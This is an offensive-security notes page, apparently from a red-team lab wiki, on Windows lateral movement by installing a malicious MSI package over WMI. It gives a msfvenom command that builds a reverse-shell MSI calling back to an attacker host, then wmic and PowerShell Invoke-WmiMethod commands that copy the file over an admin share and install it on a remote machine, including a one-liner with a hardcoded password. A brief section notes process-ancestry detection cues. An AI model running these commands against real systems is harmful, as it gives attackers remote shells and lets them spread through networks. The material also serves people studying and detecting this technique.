---
description: WMI lateral movement with .msi packages
---

# WMI + MSI Lateral Movement

## WMI + MSI Lateral Movement

### Execution

Generating malicious payload in MSI (Microsoft Installer Package):

{% code title="attacker\@local" %}
```csharp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil64.msi
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCDhrPWIvoZwxrkWmU%2F-LPC9eHXgLvVmTmTW3v6%2FScreenshot%20from%202018-10-19%2017-31-00.png?alt=media\&token=fb67a82b-82cd-4f8f-a5b0-8183cbf41d43)

I tried executing the .msi payload like so, but got a return code `1619` and a quick search on google returned nothing useful:

{% code title="attacker\@remote" %}
```csharp
wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLocation='\\10.0.0.2\c$\experiments\evil64.msi'
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCDhrPWIvoZwxrkWmU%2F-LPCQoQEYPsOml_BtpDj%2FScreenshot%20from%202018-10-19%2018-45-55.png?alt=media\&token=82a808db-cb4d-4948-ae9f-a19f3df789f7)

I had to revert to a filthy way of achieving the goal:

{% code title="attacker\@remote" %}
```csharp
net use \\10.0.0.7\c$ /user:administrator@offense; copy C:\experiments\evil64.msi \\10.0.0.7\c$\PerfLogs\setup.msi ; wmic /node:10.0.0.7 /user:administrator@offense product call install PackageLocation=c:\PerfLogs\setup.msi
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCDhrPWIvoZwxrkWmU%2F-LPCPryYmpLwVdnNoTZ0%2FPeek%202018-10-19%2018-41.gif?alt=media\&token=bc7df86f-8dbe-4e74-af11-88587c7f1108)

Additionally, the same could of be achieved using powershell cmdlets:

{% code title="attacker\@remote" %}
```csharp
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential (Get-Credential)
```
{% endcode %}

Get a prompt for credentials:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCDhrPWIvoZwxrkWmU%2F-LPCUrQ2vaTj-_DO9WKO%2FScreenshot%20from%202018-10-19%2019-02-10.png?alt=media\&token=97934dee-ab3d-4b2c-9123-2e91043f4e4e)

and enjoy the code execution:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCDhrPWIvoZwxrkWmU%2F-LPCUt52NwVTYSAMHsON%2FScreenshot%20from%202018-10-19%2019-02-48.png?alt=media\&token=ca6f5074-dcb0-417a-8580-b9a9ef2d61ac)

Or if no GUI is available for credentials, a oneliner:

{% code title="attacker\@remote" %}
```csharp
$username = 'Administrator';$password = '123456';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential $credential
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCW0VkurjwnXbey_QZ%2F-LPCWEGYLIP6TIDTb0V9%2FScreenshot%20from%202018-10-19%2019-09-42.png?alt=media\&token=c4c69475-3ac1-4158-9926-94f851019230)

### Observations

Note the process ancestry: `services > msiexec.exe > .tmp > cmd.exe`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCDhrPWIvoZwxrkWmU%2F-LPCQyCWIZhcSUbJZ1cV%2FScreenshot%20from%202018-10-19%2018-46-37.png?alt=media\&token=f7518dbd-299f-44f5-b3ae-fbde03bf87d2)

and that the connection is initiated by the .tmp file (I ran another test, hence another file name):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LPCDhrPWIvoZwxrkWmU%2F-LPCTBFAsNn9BovE4zjP%2FScreenshot%20from%202018-10-19%2018-55-53.png?alt=media\&token=8f9ce791-f54b-4555-8d43-d8205e18bfb4)

### References

[![Logo](https://www.ired.team/~gitbook/image?url=https%3A%2F%2Fwww.cybereason.com%2Fhubfs%2Fcr-favicon-1.png\&width=20\&dpr=4\&quality=100\&sign=3827614a\&sv=2)No Win32 Process Needed | Expanding the WMI Lateral Movement Arsenalwww.cybereason.com](https://www.cybereason.com/blog/wmi-lateral-movement-win32)

{% embed url="https://x.com/buffaloverflow/status/1002523407261536256/photo/1" %}
